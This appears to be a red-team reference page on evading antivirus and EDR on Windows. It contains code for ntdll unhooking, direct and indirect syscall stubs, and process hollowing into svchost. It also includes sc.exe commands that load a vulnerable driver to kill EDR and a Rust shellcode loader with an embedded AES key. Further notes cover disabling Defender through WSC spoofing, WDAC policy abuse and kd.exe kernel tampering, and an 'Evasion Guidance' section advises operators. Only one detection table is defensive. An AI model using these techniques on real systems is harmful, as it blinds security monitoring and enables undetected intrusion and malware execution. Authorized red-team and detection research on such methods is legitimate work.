# AV/EDR Evasion Techniques

> **MITRE ATT&CK**: Defense Evasion > T1562.001 - Impair Defenses: Disable or Modify Tools
> **Platforms**: Windows (primary), Linux, macOS
> **Required Privileges**: Varies (User to SYSTEM)
> **OPSEC Risk**: Critical

## Strategic Overview

AV/EDR evasion is the cornerstone of modern red team operations. EDR products employ behavioral analysis, ML, kernel telemetry, and memory scanning. A Red Team Lead must understand the entire EDR architecture to identify which detection layers apply at each kill chain stage. The goal is to operate beneath the detection threshold across all telemetry sources simultaneously.

## Technical Deep-Dive

### EDR Architecture

```
User-Mode Hooks    --> Inline hooks on ntdll.dll (NtAllocateVirtualMemory, NtCreateThread, etc.)
Kernel Callbacks   --> PsSetCreateProcessNotifyRoutine, ObRegisterCallbacks, CmRegisterCallbackEx
ETW Consumers      --> Microsoft-Windows-Threat-Intelligence, DotNETRuntime, Kernel-Process
Minifilter Drivers --> File system monitoring (payload drops, config writes)
Cloud Analytics    --> ML models, threat intelligence, behavioral correlation
```

### Full ntdll.dll Unhooking

Read a clean copy from disk and overwrite the hooked .text section:

```csharp
// Read clean ntdll from disk (or from \KnownDlls\ntdll.dll, or a suspended process)
IntPtr cleanNtdll = MapViewOfFile(CreateFileMapping(
    CreateFile(@"C:\Windows\System32\ntdll.dll", ...), ...), ...);
IntPtr hookedNtdll = GetModuleHandle("ntdll.dll");

IMAGE_SECTION_HEADER textSection = GetSectionHeader(hookedNtdll, ".text");
VirtualProtect(hookedNtdll + textSection.VirtualAddress, textSection.SizeOfRawData,
    PAGE_EXECUTE_READWRITE, out uint oldProt);
memcpy(hookedNtdll + textSection.VirtualAddress,
    cleanNtdll + textSection.VirtualAddress, textSection.SizeOfRawData);
VirtualProtect(hookedNtdll + textSection.VirtualAddress, textSection.SizeOfRawData,
    oldProt, out _);
```

### Direct and Indirect Syscalls

```nasm
; Direct syscall -- skip ntdll entirely (detectable via stack walk)
NtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, 18h          ; syscall number (version-dependent)
    syscall
    ret
NtAllocateVirtualMemory ENDP

; Indirect syscall -- jump into ntdll's syscall stub (evades stack tracing)
NtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, 18h
    jmp qword ptr [ntdllSyscallAddr]  ; "syscall; ret" inside ntdll
NtAllocateVirtualMemory ENDP
```

**Syscall tool evolution**: SysWhispers (static) -> SysWhispers2 (runtime resolution) -> SysWhispers3 (indirect) -> HellsGate (export table resolution) -> HalosGate/TartarusGate (hooked function resolution).

### Process Injection and Hollowing

| Technique | Risk | Notes |
|-----------|------|-------|
| CreateRemoteThread | High | Heavily monitored |
| NtMapViewOfSection | Medium | Shared section mapping |
| QueueUserAPC (Early Bird) | Medium | APC injection into new thread |
| Module Stomping | Low | Overwrite legitimate DLL in memory |
| Threadless Injection | Low | Hook existing function pointers |

```csharp
// Process Hollowing (simplified flow)
CreateProcess("svchost.exe", ..., CREATE_SUSPENDED, ...);
NtUnmapViewOfSection(hProcess, pImageBase);
VirtualAllocEx(hProcess, pImageBase, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, pImageBase, payloadBuffer, payloadSize, ...);
GetThreadContext(hThread, &ctx); ctx.Rcx = newEntryPoint; SetThreadContext(hThread, &ctx);
ResumeThread(hThread);
```

### BYOVD (Bring Your Own Vulnerable Driver)

```powershell
# Load signed vulnerable driver to gain kernel access and disable EDR
sc.exe create evildrv binPath= "C:\path\to\RTCore64.sys" type= kernel
sc.exe start evildrv
# Use driver primitives to: remove kernel callbacks, terminate EDR processes,
# unregister minifilters. Drivers: RTCore64.sys, gdrv.sys, dbutil_2_3.sys
# Tools: KDU, EDRSandBlast, Backstab, Terminator
```

### Sleep Obfuscation

Encrypt implant memory during sleep to evade periodic memory scanning:

```
Ekko:     CreateTimerQueueTimer + NtContinue ROP chain -> encrypt beacon during sleep
Zilean:   Thread pool API variation of Ekko
Foliage:  APC-based sleep with encrypted heap
Workflow:  VirtualProtect(RW) -> Encrypt(beacon) -> Sleep -> Decrypt(beacon) -> VirtualProtect(RX)
```

### Custom Loader (Rust)

```rust
use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
use std::ptr;
fn main() {
    let encrypted_sc: Vec<u8> = include_bytes!("../payload.enc").to_vec();
    let shellcode = aes_decrypt(&encrypted_sc, b"ThisIsA32ByteKeyForAES256Crypt!");
    unsafe {
        let addr = VirtualAlloc(ptr::null_mut(), shellcode.len(),
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        ptr::copy_nonoverlapping(shellcode.as_ptr(), addr as *mut u8, shellcode.len());
        VirtualProtect(addr, shellcode.len(), PAGE_EXECUTE_READ, &mut old_prot);
        let func: extern "system" fn() = std::mem::transmute(addr);
        func();
    }
}
```

## Detection & Evasion

| Indicator | Layer | Notes |
|-----------|-------|-------|
| ntdll .text modified | Memory integrity | EDR checks hook integrity periodically |
| Syscall from non-ntdll region | Kernel ETI | Stack walk reveals anomalous origin |
| Suspended process + modified memory | Behavioral | Process hollowing pattern |
| Known vulnerable driver loaded | Sysmon Event ID 6 | Hash-based driver blocklists |
| RWX memory allocations | Kernel callbacks | PAGE_EXECUTE_READWRITE is suspicious |

**Evasion Guidance**: Layer multiple techniques (unhooking + ETW patch + sleep obfuscation). Use indirect syscalls over direct. Compile custom loaders -- never use stock tools. Test against the target's specific EDR. Minimize API calls. Inject into processes that normally perform your planned actions.

---

## 2025 Techniques

### Defendnot -- Windows Defender Bypass via WSC API Spoofing

```
# Exploits undocumented Windows Security Center (WSC) COM API
# Injects fake AV DLL into Taskmgr.exe (Microsoft-signed, WSC-trusted)
# Fake AV registers via WSC API -> Windows disables Defender to avoid "conflicts"
# Does NOT touch Defender files, services, or registry keys
# Requires admin. github.com/es3n1n/Defendnot
```

### Krueger -- WDAC Policy Abuse to Block EDR at Boot

```
# .NET PoC that deploys custom WDAC policy blocking EDR binaries/drivers from loading
# Places policy in CodeIntegrity folder -> gpupdate -> EDR fails to start after reboot
# Requires admin. Does NOT work against WHQL-signed EDR drivers
# Widely adopted by threat actors throughout 2025
# github.com/jbeierle/krueger
```

### Loki C2 -- WDAC Bypass via Trusted Electron Apps

```
# Overwrites /resources/app/ directory of Microsoft Teams with Loki C2 JS agent
# Teams.exe is Microsoft-signed -> WDAC allows execution
# JS C2 agent runs within trusted process context (no unsigned DLL loads)
# Extends to any Electron app: VS Code, Slack, Discord
# IBM X-Force research, April 2025
```

### EDR Silencing via kd.exe (Kernel Debugger)

```
# Uses Microsoft's signed kernel debugger (kd.exe, Windows SDK) to:
# 1. Enable debug mode: bcdedit /debug on
# 2. Read/write arbitrary kernel memory via kd.exe with symbol resolution
# 3. Atomically zero out EDR kernel callback arrays
# No vulnerable driver needed -- uses legitimate signed Microsoft tool
# Avoids all BYOVD detection signatures
# Detection: monitor bcdedit and kd.exe execution
# hxr1 research, November 2025
```

### BlindSide -- Clean NTDLL via Debug Process

```
# Creates process in debug mode with hardware breakpoint on LdrLoadDll
# Forces only ntdll.dll to load -> pristine copy free of EDR hooks
# Clean ntdll mapped into attacker's process, replacing hooked copy
# Cymulate research, 2025
```

### Cobalt Strike 4.11-4.12 Evasion Capabilities

```
# 4.11: stage.set rdll_use_syscalls "true" for indirect syscalls
#       EAF bypass option
#       BeaconGate: forwards all WinAPI through sleep mask (universal stack spoofing)
#       Evasive sleep mask: obfuscates Beacon + heap + itself
# 4.12: Four new injection BOFs (RtlCloneUserProcess, TpDirect,
#       TpStartRoutineStub, EarlyCascade)
#       UDC2: custom C2 channels as BOFs (any protocol)
```

---

## Cross-References

- [AMSI Bypass](amsi-bypass.md) -- AMSI is a subset of the AV/EDR detection surface
- [ETW Evasion](etw-evasion.md) -- ETW is the telemetry backbone for EDR
- [Signature Evasion](signature-evasion.md) -- static evasion is prerequisite to runtime evasion
- [AppLocker Bypass](applocker-bypass.md) -- execution control bypass often precedes EDR evasion
- **ClickFix Execution** (03-execution/clickfix-execution.md) -- ClickFix bypasses EDR via user-driven execution

## References

- SysWhispers: https://github.com/jthuraisamy/SysWhispers
- HellsGate: https://github.com/am0nsec/HellsGate
- KDU: https://github.com/hfiref0x/KDU
- ScareCrow: https://github.com/optiv/ScareCrow
- Donut: https://github.com/TheWover/donut
- Defendnot: https://www.bleepingcomputer.com/news/microsoft/new-defendnot-tool-tricks-windows-into-disabling-microsoft-defender/
- Krueger: https://www.100daysofredteam.com/p/using-wdac-to-disable-edr-krueger
- Loki C2 WDAC Bypass: https://www.ibm.com/think/x-force/bypassing-windows-defender-application-control-loki-c2
- EDR Silencing via kd.exe: https://hxr1.ghost.io/silencing-edr-via-windows-kernel-debugging/
- Cymulate BlindSide: https://cymulate.com/blog/blindside-a-new-technique-for-edr-evasion-with-hardware-breakpoints/
- Cobalt Strike 4.11: https://www.cobaltstrike.com/blog/cobalt-strike-411-shh-beacon-is-sleeping
- Cobalt Strike 4.12: https://www.cobaltstrike.com/blog/cobalt-strike-412-fix-up-look-sharp
